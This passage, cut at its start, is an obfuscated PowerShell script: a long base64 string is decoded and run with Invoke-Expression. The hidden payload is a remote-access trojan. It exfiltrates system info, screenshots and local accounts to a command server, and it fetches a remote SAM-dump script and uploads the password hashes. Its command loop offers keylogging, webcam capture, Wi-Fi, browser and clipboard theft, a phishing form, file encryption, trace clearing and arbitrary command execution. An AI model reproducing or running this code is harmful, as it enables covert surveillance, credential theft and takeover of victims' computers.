iAgICAgICAgICAgICRiaXRtYXAuU2F2ZSgkdGVtcEZpbGUsIFtTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0XTo6UG5nKQoKICAgICAgICAgICAgJGdyYXBoaWNzLkRpc3Bvc2UoKQogICAgICAgICAgICAkYml0bWFwLkRpc3Bvc2UoKQoKICAgICAgICAgICAgU2VuZC1UZWxlZ3JhbUZpbGUgLWZpbGVQYXRoICR0ZW1wRmlsZQoKICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkdGVtcEZpbGUpIHsKICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICR0ZW1wRmlsZSAtRm9yY2UKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJTY3JlZW5zaG90IGNhcHR1cmUgZmFpbGVkOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CgogICAgfSkuQWRkQXJndW1lbnQoJFNFUlZFUl9VUkwpCgogICAgIyBCZWdpbiBiYWNrZ3JvdW5kIGV4ZWN1dGlvbgogICAgJG51bGwgPSAkcHMuQmVnaW5JbnZva2UoKQoKICAgIHJldHVybiAiU2NyZWVuc2hvdCBjYXB0dXJlIHN0YXJ0ZWQgaW4gYmFja2dyb3VuZC4iCn0KCmZ1bmN0aW9uIEdldC1TeXN0ZW1JbmZvIHsKICAgICRzZW5kID0gIiRTRVJWRVJfVVJML3N5c3RlbSIKCiAgICAkdXNlcm5hbWUgPSAkZW52OlVTRVJOQU1FCiAgICAkcHJpdmF0ZV9pcCA9IChHZXQtTmV0SVBBZGRyZXNzIC1BZGRyZXNzRmFtaWx5IElQdjQgfCBXaGVyZS1PYmplY3QgeyAkXy5JbnRlcmZhY2VBbGlhcyAtbm90bGlrZSAiKkxvb3BiYWNrKiIgfSkuSVBBZGRyZXNzCiAgICAkbWFjX2FkZHJlc3MgPSAoR2V0LU5ldEFkYXB0ZXIgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNYWNBZGRyZXNzKQogICAgJHVzZXJfcHJpdmlsZWdlID0gaWYgKChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuR3JvdXBzIC1tYXRjaCAiUy0xLTUtMzItNTQ0IikgeyAiQWRtaW5pc3RyYXRvciIgfSBlbHNlIHsgIlN0YW5kYXJkIFVzZXIiIH0KICAgICRvc192ZXJzaW9uID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkNhcHRpb24KICAgICRiYXR0ZXJfcGVyID0gKEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0JhdHRlcnkpLkVzdGltYXRlZENoYXJnZVJlbWFpbmluZy5Ub1N0cmluZygpICsgIiUiCgogICAgIyBDb252ZXJ0IHRvIHBsYWluIHRleHQgZm9ybWF0IChubyBxdW90ZXMgb3IgYnJhY2VzKQogICAgJHJlc3VsdFRleHQgPSBAIgpCYXR0ZXJ5OiAkYmF0dGVyX3BlcgpVc2VyX1ByaXZpbGVnZTogJHVzZXJfcHJpdmlsZWdlCk9TX1ZlcnNpb246ICRvc192ZXJzaW9uClVzZXJuYW1lOiAkdXNlcm5hbWUKTWFjX0FkZHJlc3M6ICRtYWNfYWRkcmVzcwpQcml2YXRlX0lQOiAkcHJpdmF0ZV9pcAoiQAoKICAgICRkYXRhID0gQHsgcmVzdWx0ID0gJHJlc3VsdFRleHQgfSB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAzCgogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkc2VuZCAtTWV0aG9kIFBvc3QgLUJvZHkgJGRhdGEgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uJwp9CgpmdW5jdGlvbiBHZXQtTG9jYWxBY2NvdW50cyB7CiAgICB0cnkgewogICAgICAgICRhY2NvdW50cyA9IEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Vc2VyQWNjb3VudCAtRmlsdGVyICdMb2NhbEFjY291bnQ9VHJ1ZScgfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IE5hbWUsIFNJRCwgUGFzc3dvcmRSZXF1aXJlZCwgUGFzc3dvcmRDaGFuZ2VhYmxlCgogICAgICAgIGlmICgtbm90ICRhY2NvdW50cykgewogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CgogICAgICAgICRwYXlsb2FkID0gQHsgcmVzdWx0ID0gJGFjY291bnRzIH0KICAgICAgICAkanNvbkJvZHkgPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAzCgogICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgIiRTRVJWRVJfVVJML3N5c3RlbSIgLU1ldGhvZCBQT1NUIC1Cb2R5ICRqc29uQm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iIC1UaW1lb3V0U2VjIDEwCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgIyBzaWxlbnRseSBpZ25vcmUgZXJyb3JzIG9yIHlvdSBjYW4gbG9nIGlmIG5lZWRlZAogICAgfQp9Cgokam9iU2NyaXB0ID0gewogICAgcGFyYW0oJHNlcnZlclVybCkKCiAgICBmdW5jdGlvbiBTZW5kLVRlbGVncmFtRmlsZSB7CiAgICAgICAgcGFyYW0oW3N0cmluZ10kZmlsZVBhdGgpCgogICAgICAgIGlmICgtbm90IChbU3lzdGVtLklPLlBhdGhdOjpJc1BhdGhSb290ZWQoJGZpbGVQYXRoKSkpIHsKICAgICAgICAgICAgJGZpbGVQYXRoID0gSm9pbi1QYXRoIC1QYXRoIChHZXQtTG9jYXRpb24pLlBhdGggLUNoaWxkUGF0aCAkZmlsZVBhdGgKICAgICAgICB9CgogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGZpbGVQYXRoKSkgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiRmlsZSBub3QgZm91bmQ6ICRmaWxlUGF0aCIKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgfQoKICAgICAgICAkdXJpID0gIiRzZXJ2ZXJVcmwvZmlsZXMiCiAgICAgICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJGZpbGVQYXRoKQogICAgICAgICRib3VuZGFyeSA9IFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpCiAgICAgICAgJExGID0gImByYG4iCgogICAgICAgICRmaWxlQ29udGVudCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkZmlsZVBhdGgpCgogICAgICAgICRoZWFkZXIgPSAiLS0kYm91bmRhcnkkTEYiICsKICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1gImRvY3VtZW50YCI7IGZpbGVuYW1lPWAiJGZpbGVOYW1lYCIkTEYiICsKICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJExGJExGIgogICAgICAgICRmb290ZXIgPSAiJExGLS0kYm91bmRhcnktLSRMRiIKCiAgICAgICAgJGhlYWRlckJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkaGVhZGVyKQogICAgICAgICRmb290ZXJCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGZvb3RlcikKCiAgICAgICAgJGJvZHlCeXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdICgkaGVhZGVyQnl0ZXMuTGVuZ3RoICsgJGZpbGVDb250ZW50Lkxlbmd0aCArICRmb290ZXJCeXRlcy5MZW5ndGgpCiAgICAgICAgW1N5c3RlbS5CdWZmZXJdOjpCbG9ja0NvcHkoJGhlYWRlckJ5dGVzLCAwLCAkYm9keUJ5dGVzLCAwLCAkaGVhZGVyQnl0ZXMuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uQnVmZmVyXTo6QmxvY2tDb3B5KCRmaWxlQ29udGVudCwgMCwgJGJvZHlCeXRlcywgJGhlYWRlckJ5dGVzLkxlbmd0aCwgJGZpbGVDb250ZW50Lkxlbmd0aCkKICAgICAgICBbU3lzdGVtLkJ1ZmZlcl06OkJsb2NrQ29weSgkZm9vdGVyQnl0ZXMsIDAsICRib2R5Qnl0ZXMsICRoZWFkZXJCeXRlcy5MZW5ndGggKyAkZmlsZUNvbnRlbnQuTGVuZ3RoLCAkZm9vdGVyQnl0ZXMuTGVuZ3RoKQoKICAgICAgICB0cnkgewogICAgICAgICAgICAkcmVxdWVzdCA9IFtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXF1ZXN0XTo6Q3JlYXRlKCR1cmkpCiAgICAgICAgICAgICRyZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgogICAgICAgICAgICAkcmVxdWVzdC5Db250ZW50VHlwZSA9ICJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0kYm91bmRhcnkiCiAgICAgICAgICAgICRyZXF1ZXN0LkNvbnRlbnRMZW5ndGggPSAkYm9keUJ5dGVzLkxlbmd0aAoKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0gPSAkcmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICAgICAgICAgJHJlcXVlc3RTdHJlYW0uV3JpdGUoJGJvZHlCeXRlcywgMCwgJGJvZHlCeXRlcy5MZW5ndGgpCiAgICAgICAgICAgICRyZXF1ZXN0U3RyZWFtLkNsb3NlKCkKCiAgICAgICAgICAgICRyZXNwb25zZSA9ICRyZXF1ZXN0LkdldFJlc3BvbnNlKCkKICAgICAgICAgICAgJHJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCRyZXNwb25zZS5HZXRSZXNwb25zZVN0cmVhbSgpKQogICAgICAgICAgICAkcmVzcG9uc2VDb250ZW50ID0gJHJlYWRlci5SZWFkVG9FbmQoKQogICAgICAgICAgICAkcmVhZGVyLkNsb3NlKCkKICAgICAgICAgICAgJHJlc3BvbnNlLkNsb3NlKCkKCiAgICAgICAgICAgIFdyaXRlLUhvc3QgIkZpbGUgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5LiIKICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3IgdXBsb2FkaW5nIGZpbGU6ICRfIgogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBJbnZva2UtQ3JlZGVudGlhbER1bXAgewogICAgICAgIFdyaXRlLUhvc3QgIiAqIER1bXAgY3JlZGVudGlhbHMgZnJvbSByZWdpc3RyeSBoaXZlcy4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KICAgICAgICBXcml0ZS1Ib3N0ICIiCgogICAgICAgICRpc0FkbWluID0gKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuR3JvdXBzIC1tYXRjaCAiUy0xLTUtMzItNTQ0IgoKICAgICAgICBpZiAoJGlzQWRtaW4pIHsKICAgICAgICAgICAgJHRlbXBQYXRoID0gJEVudjpURU1QCiAgICAgICAgICAgICRkdW1wU2NyaXB0ID0gSm9pbi1QYXRoICR0ZW1wUGF0aCAiSW52b2tlLUR1bXAucHMxIgogICAgICAgICAgICAkZHVtcFVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcjAwdC0zeHAxMGl0L3JlZHBpbGwvbWFpbi9saWIvRHVtcC1TYW0vSW52b2tlLUR1bXAucHMxIgogICAgICAgICAgICAkb3V0cHV0RmlsZSA9IEpvaW4tUGF0aCAkdGVtcFBhdGggImhhc2hlcy50eHQiCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgU2V0LUxvY2F0aW9uIC1QYXRoICR0ZW1wUGF0aAogICAgICAgICAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkZHVtcFVybCAtT3V0RmlsZSAkZHVtcFNjcmlwdCAtVXNlQmFzaWNQYXJzaW5nCiAgICAgICAgICAgICAgICBVbmJsb2NrLUZpbGUgLVBhdGggJGR1bXBTY3JpcHQKICAgICAgICAgICAgICAgIEltcG9ydC1Nb2R1bGUgLU5hbWUgJGR1bXBTY3JpcHQgLUZvcmNlCgogICAgICAgICAgICAgICAgSW52b2tlLUR1bXAgfCBPdXQtRmlsZSAtRmlsZVBhdGggJG91dHB1dEZpbGUgLUVuY29kaW5nIFVURjgKCiAgICAgICAgICAgICAgICBTZW5kLVRlbGVncmFtRmlsZSAtZmlsZVBhdGggJG91dHB1dEZpbGUKCiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkZHVtcFNjcmlwdCAtRm9yY2UKCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICIgKiBDcmVkZW50aWFscyBkdW1wZWQgdG8gJG91dHB1dEZpbGUiIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLUVycm9yICJGYWlsZWQgZHVyaW5nIGNyZWRlbnRpYWwgZHVtcCBwcm9jZXNzOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJGVycm9yTG9nID0gSm9pbi1QYXRoICRFbnY6VEVNUCAiZmRkZHMubG9nIgogICAgICAgICAgICAiICAgPiBFcnJvcjogYWRtaW5pc3RyYXRvciBwcml2aWxlZ2VzIHJlcXVpcmVkLiIgfCBPdXQtRmlsZSAtRmlsZVBhdGggJGVycm9yTG9nCiAgICAgICAgICAgIEdldC1Db250ZW50IC1QYXRoICRlcnJvckxvZwogICAgICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkZXJyb3JMb2cgLUZvcmNlCiAgICAgICAgfQogICAgfQoKICAgIEludm9rZS1DcmVkZW50aWFsRHVtcAp9CgpmdW5jdGlvbiBPcGVuLXVybCAoJHVybCkgewogICAgU3RhcnQtUHJvY2VzcyAkdXJsCn0KCmZ1bmN0aW9uIEZldGNoLUNvbW1hbmQgewogICAgdHJ5IHsKICAgICAgICByZXR1cm4gKEludm9rZS1SZXN0TWV0aG9kIC1VcmkgIiRTRVJWRVJfVVJML2xhc3QtY29tbWFuZC8kc2Vzc2lvbl9pZCIgLU1ldGhvZCBHZXQpLmNvbW1hbmQKICAgIH0gY2F0Y2ggewogICAgICAgIHJldHVybiAkbnVsbAogICAgfQp9CgpmdW5jdGlvbiBTZW5kLVJlc3VsdCgkcmVzdWx0KSB7CiAgICB0cnkgewogICAgICAgIGlmICgkcmVzdWx0IC1pcyBbaGFzaHRhYmxlXSkgewogICAgICAgICAgICAkcmVzdWx0ID0gRm9ybWF0LVJlc3BvbnNlIC1kYXRhICRyZXN1bHQKICAgICAgICB9IGVsc2VpZiAoJHJlc3VsdCAtaXMgW1N5c3RlbS5BcnJheV0pIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICRyZXN1bHQgLWpvaW4gImBuIgogICAgICAgIH0KCiAgICAgICAgJGJvZHkgPSBAewogICAgICAgICAgICBzZXNzaW9uID0gJHNlc3Npb25faWQKICAgICAgICAgICAgcmVzdWx0ID0gJHJlc3VsdAogICAgICAgIH0gfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMwoKICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICIkU0VSVkVSX1VSTC9jb21tYW5kLXJlc3VsdCIgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKICAgIH0gY2F0Y2gge30KfQoKJGdsb2JhbDpjdXJyZW50RGlyZWN0b3J5ID0gR2V0LUxvY2F0aW9uCgpmdW5jdGlvbiBFeGVjdXRlKCRjb21tYW5kKSB7CiAgICB0cnkgewogICAgICAgIGlmICgkY29tbWFuZCAtbWF0Y2ggJ15jZFxzKyguKykkJykgewogICAgICAgICAgICAkdGFyZ2V0ID0gJE1hdGNoZXNbMV0uVHJpbSgpCgogICAgICAgICAgICBpZiAoJHRhcmdldCAtZXEgIi4uIikgewogICAgICAgICAgICAgICAgJHBhcmVudCA9IFNwbGl0LVBhdGggLVBhdGggJGdsb2JhbDpjdXJyZW50RGlyZWN0b3J5IC1QYXJlbnQKICAgICAgICAgICAgICAgIGlmICgtbm90IFtzdHJpbmddOjpJc051bGxPcldoaXRlU3BhY2UoJHBhcmVudCkpIHsKICAgICAgICAgICAgICAgICAgICAkZ2xvYmFsOmN1cnJlbnREaXJlY3RvcnkgPSAkcGFyZW50CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gIk1vdmVkIHVwIHRvOiAkZ2xvYmFsOmN1cnJlbnREaXJlY3RvcnkiCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkbmV3UGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZ2xvYmFsOmN1cnJlbnREaXJlY3RvcnkgLUNoaWxkUGF0aCAkdGFyZ2V0CiAgICAgICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRuZXdQYXRoIC1QYXRoVHlwZSBDb250YWluZXIpIHsKICAgICAgICAgICAgICAgICAgICAkZ2xvYmFsOmN1cnJlbnREaXJlY3RvcnkgPSAkbmV3UGF0aAogICAgICAgICAgICAgICAgICAgIHJldHVybiAiQ2hhbmdlZCBkaXJlY3RvcnkgdG86ICRnbG9iYWw6Y3VycmVudERpcmVjdG9yeSIKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJEaXJlY3Rvcnkgbm90IGZvdW5kOiAkdGFyZ2V0IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG91dHB1dCA9IHBvd2Vyc2hlbGwuZXhlIC1Ob0xvZ28gLU5vUHJvZmlsZSAtQ29tbWFuZCAiU2V0LUxvY2F0aW9uICckZ2xvYmFsOmN1cnJlbnREaXJlY3RvcnknOyAkY29tbWFuZCIgMj4mMQogICAgICAgICAgICByZXR1cm4gJG91dHB1dCB8IE91dC1TdHJpbmcKICAgICAgICB9CiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gIkV4ZWN1dGlvbiBmYWlsZWQ6ICRfIgogICAgfQp9CgpmdW5jdGlvbiBHZXQtTG9jYWxBY2NvdW50cyB7CgogICAgdHJ5IHsKICAgICAgICAkYWNjb3VudHMgPSBHZXQtV21pT2JqZWN0IFdpbjMyX1VzZXJBY2NvdW50IC1GaWx0ZXIgJ0xvY2FsQWNjb3VudD1UcnVlJyB8CiAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgTmFtZSwgU0lELCBQYXNzd29yZFJlcXVpcmVkLCBQYXNzd29yZENoYW5nZWFibGUKCiAgICAgICAgaWYgKC1ub3QgJGFjY291bnRzKSB7CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KCiAgICAgICAgIyBXcmFwIGluICdyZXN1bHQnIHByb3BlcnR5CiAgICAgICAgJHBheWxvYWQgPSBAeyByZXN1bHQgPSAkYWNjb3VudHMgfQogICAgICAgICRqc29uQm9keSA9ICRwYXlsb2FkIHwgQ29udmVydFRvLUpzb24gLURlcHRoIDMKCiAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAiJFNFUlZFUl9VUkwvc3lzdGVtIiAtTWV0aG9kIFBPU1QgLUJvZHkgJGpzb25Cb2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKCiAgICAgICAgJGFjY291bnRzIHwgRm9ybWF0LVRhYmxlIC1BdXRvU2l6ZQogICAgfQogICAgY2F0Y2ggewogICAgfQp9CgoKZnVuY3Rpb24gTWFpbiB7CiAgICBOb3RpZnktQ29ubmVjdGlvbgogICAgJGxhc3RfY29tbWFuZCA9ICIiCgogICAgdHJ5IHsKICAgICAgICB3aGlsZSAoJHRydWUpIHsKICAgICAgICAgICAgJGNvbW1hbmQgPSBGZXRjaC1Db21tYW5kCiAgICAgICAgICAgIGlmICgkY29tbWFuZCAtYW5kICRjb21tYW5kIC1uZSAkbGFzdF9jb21tYW5kKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJbK10gRXhlY3V0aW5nOiAkY29tbWFuZCIKCiAgICAgICAgICAgICAgICAkY29tbWFuZFBhcnRzID0gJGNvbW1hbmQuU3BsaXQoIiAiLCAyKQogICAgICAgICAgICAgICAgJG1haW5Db21tYW5kID0gJGNvbW1hbmRQYXJ0c1swXQogICAgICAgICAgICAgICAgJGNvbW1hbmRBcmd1bWVudCA9IGlmICgkY29tbWFuZFBhcnRzLkNvdW50IC1ndCAxKSB7ICRjb21tYW5kUGFydHNbMV0uVHJpbSgpIH0gZWxzZSB7ICIiIH0KCiAgICAgICAgICAgICAgICBzd2l0Y2ggKCRtYWluQ29tbWFuZCkgewogICAgICAgICAgICAgICAgICAgICJHZXQtU3lzdGVtSW5mbyIgewogICAgICAgICAgICAgICAgICAgICAgICAgR2V0LVN5c3RlbUluZm8KICAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAic2NyZWVuc2hvdCIgewogICAgICAgICAgICAgICAgICAgICAgICAkbnVsbCA9IFdyaXRlLUhvc3QgKENhcHR1cmUtQW5kLVNlbmQtU2NyZWVuc2hvdCAtU0VSVkVSX1VSTCAkU0VSVkVSX1VSTCkKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJ3ZWJjYW0iIHsKICAgICAgICAgICAgICAgICAgICAgICAgV2ViY2FtQ2FwdHVyZQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIk9wZW4tdXJsIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIE9wZW4tdXJsICRjb21tYW5kQXJndW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJrZXlsb2dnZXJvbiIgewogICAgICAgICAgICAgICAgICAgICAgICBTdGFydC1LZXlsb2dnZXIKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJrZXlsb2dnZXJvZmYiIHsKICAgICAgICAgICAgICAgICAgICAgICAgU3RvcC1LZXlsb2dnZXIKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJmaWxlX2VuY3J5cHQiIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IEVuY3J5cHQtRmlsZVdpdGhQYXNzd29yZCAtZmlsZVBhdGggJGNvbW1hbmRBcmd1bWVudAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiZmlsZV9kZWNyeXB0IiB7CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBEZWNyeXB0LUZpbGVXaXRoUGFzc3dvcmQgLWZpbGVQYXRoICRjb21tYW5kQXJndW1lbnQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgImRvd25sb2FkX2ZpbGUiIHsKICAgICAgICAgICAgICAgICAgICAgICAgU2VuZC1UZWxlZ3JhbUZpbGUgLWZpbGVQYXRoICRjb21tYW5kQXJndW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJmZXRjaF93aWZpX2NyZWRzIiB7CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBHZXQtV2lmaVBhc3N3b3JkcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiY2hhbmdlX3dhbGxwYXBlciIgewogICAgICAgICAgICAgICAgICAgICAgICBTZXQtV2FsbHBhcGVyICRjb21tYW5kQXJndW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJraWxsX3Nlc3Npb24iIHsKICAgICAgICAgICAgICAgICAgICAgICAgS2lsbC1BbGxQb3dlclNoZWxsUHJvY2Vzc2VzCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiY2xlYXJfdHJhY2UiIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ2xlYXItVGVtcERpcgogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgImJyb3dzZXJfZGF0YSIgewogICAgICAgICAgICAgICAgICAgICAgICBGZXRjaC1Ccm93c2VyRGF0YQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgImNsaXBib2FyZF9kYXRhIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNlbmQtQ2xpcGJvYXJkCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAicGhpc2hpbmciIHsKICAgICAgICAgICAgICAgICAgICAgICAgU2hvdy1TZWN1cml0eUZvcm0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAic2h1dGRvd25fc3lzdGVtIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNodXRkb3duLVN5c3RlbQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJyZXN0YXJ0X3N5c3RlbSIgewogICAgICAgICAgICAgICAgICAgICAgICBSZXN0YXJ0LVN5c3RlbQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJ0ZWxlZ3JhbV9kYXRhIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZldGNoLXRlbGVncmFtLWRhdGEKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJkdW1wc2FtX2hhc2hlcyIgewogICAgICAgICAgICAgICAgICAgICAgICBTdGFydC1Kb2IgLVNjcmlwdEJsb2NrICRqb2JTY3JpcHQgLUFyZ3VtZW50TGlzdCAkU0VSVkVSX1VSTCB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiZHVtcF9hY2NvdW50cyIgewogICAgICAgICAgICAgICAgICAgICAgICBHZXQtTG9jYWxBY2NvdW50cwogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBFeGVjdXRlICRjb21tYW5kCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkcmVzdWx0KSB7CiAgICAgICAgICAgICAgICAgICAgU2VuZC1SZXN1bHQgJHJlc3VsdAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRsYXN0X2NvbW1hbmQgPSAkY29tbWFuZAogICAgICAgICAgICB9CgogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1CiAgICAgICAgfQogICAgfQogICAgZmluYWxseSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJGJvZHkgPSBAeyBzZXNzaW9uID0gJHNlc3Npb25faWQgfSB8IENvbnZlcnRUby1Kc29uCiAgICAgICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgIiRTRVJWRVJfVVJML2Rpc2Nvbm5lY3QiIC1NZXRob2QgUG9zdCAtQm9keSAkYm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgfSBjYXRjaCB7fQogICAgfQp9CgpNYWluCg=='); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated
